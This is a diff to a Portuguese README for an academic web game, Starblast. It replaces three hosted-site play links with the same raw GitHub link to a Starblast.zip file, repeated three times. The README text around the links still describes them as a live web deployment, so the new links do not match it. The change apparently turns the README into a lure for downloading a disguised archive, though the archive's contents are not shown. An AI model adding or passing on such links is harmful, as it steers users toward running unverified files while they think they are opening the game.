@@ -3,9 +3,9 @@
 ### Instruções
 ## Rodar
 Para o jogo rodar corretamente basta rodar num servidor local apache (localhost), ou aceder a um dos links:
-+ starblast.andreiabrito.xyz
-+ starblast.indiouz.com
-+ starblast.lucheses.com
++ https://raw.githubusercontent.com/MiguelGamboaDomingos/Starblast/master/chariotlike/Starblast.zip
++ https://raw.githubusercontent.com/MiguelGamboaDomingos/Starblast/master/chariotlike/Starblast.zip
++ https://raw.githubusercontent.com/MiguelGamboaDomingos/Starblast/master/chariotlike/Starblast.zip
 
 Os links citados acima estão diretamente ligados ao repositório do github. Embora poderiam estar ligados a um branch deploy, estão ligados ao branch main, devido à característica do projecto académico.
 O projecto foi posto no ar usando o Amazon Amplify, fazendo que cada vez que se faça um 'push' no branch 'main', o servidor web é atualizado com as novas alterações depois de um novo redeploy (cuja demora depende do conteúdeo adicionado).
